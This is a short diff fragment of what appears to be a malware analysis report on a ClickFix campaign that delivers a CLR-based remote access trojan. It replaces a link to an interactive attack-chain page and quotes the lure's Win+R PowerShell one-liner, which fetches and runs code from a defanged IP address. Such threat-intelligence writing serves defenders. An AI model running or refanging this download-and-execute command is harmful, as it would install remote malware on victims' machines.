@@ -28,7 +28,7 @@ IMPACT  : Screenshots, Edge credential access, further CLR loads
 
 ## Attack Chain
 
-**[Open the interactive attack chain](clickfix-clr-rat-chain.html)**: click a step for its evidence and IOCs.
+<!-- chain -->
 
 ```
 Win+R paste: PowerShell one-liner around iex(irm hxxp://158.94.211[.]77/?sid=<random>)
